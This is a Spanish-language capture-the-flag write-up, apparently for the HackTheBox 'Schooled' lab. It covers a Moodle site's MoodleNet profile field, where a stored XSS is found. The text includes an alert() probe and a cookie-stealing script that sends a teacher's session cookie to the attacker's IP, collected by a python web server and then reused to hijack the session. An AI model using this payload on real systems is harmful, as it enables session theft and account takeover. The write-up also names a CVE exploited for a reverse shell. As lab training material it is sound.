## Vulnerability Assessment {-}


### Moodle {-}

Por la url `http://moodle.schooled.htb` vemos usuarios que ya tenemos en nuestro diccionario. Vemos que para ver los recursos, nos tenemos que
loggear. Hay la posibilidad de loggearnos como guest o de crear un nuevo usuario. 

Empezamos por crear un usuario. Vemos durante esta fase que necessitamos un email de typo `@student.schooled.htb`, lo a√±admimos en el `/etc/hosts`.
pero la web por `http://student.schooled.htb` no cambia.

Vemos que estamos registrados como estudiante y tenemos acceso al curso **Mathematics**. Le damos al boton **enroll** para suscribirnos al curso.
Encontramos mensajes de profesores que nos dice que tenemos que tener el profile de MoodelNet para podernos suscribir al curso. 
Si vamos en nuestro perfil de usuario vemos que hay un campo MoodleNet profile. Nos llama la atencion el echo que el profe dice en el mensaje que
va a controlar todos los perfiles moodleNet antes que la classe empieze.

Miramos si hay una posibilidad de injectar un XSS en el campo MoodleNet Profile

### XSS {-}

```bash
<script>alert("XSS")</script>
```

Le damos a Update profile y vemos que una popup se pone visible. Como vemos que es vulnerable, vamos a intentar robar la cookie de session de Manuel Phillips.

1. Montamos un servidor web con python

    ```bash
    python3 -m http.server 80
    ```

1. Injectamos el XSS en la web

    ```html+
    <script>document.location="http://10.10.16.3/value_cookie=" + document.cookie</script>
    ```

1. Le damos a Update Profile.

Esperamos un poco y vemos que una peticion a sido lanzada y vemos una cookie de session 

```{r, echo = FALSE, fig.cap="MoodleNet XSS", out.width="90%"}
    knitr::include_graphics("images/Schooled-moodlenet-xss.png")
```

Cambiamos la cookie desde firefox y recargamos la pagina. Ya vemos que nos hemos convertido en Manuel Philips.
Buscando por internet con busquedas de typo `moodle professor role rce github`, vemos que existe un CVE 2020-14321.

Encontramos un exploit y lo utilizamos para crear una reverse shell.
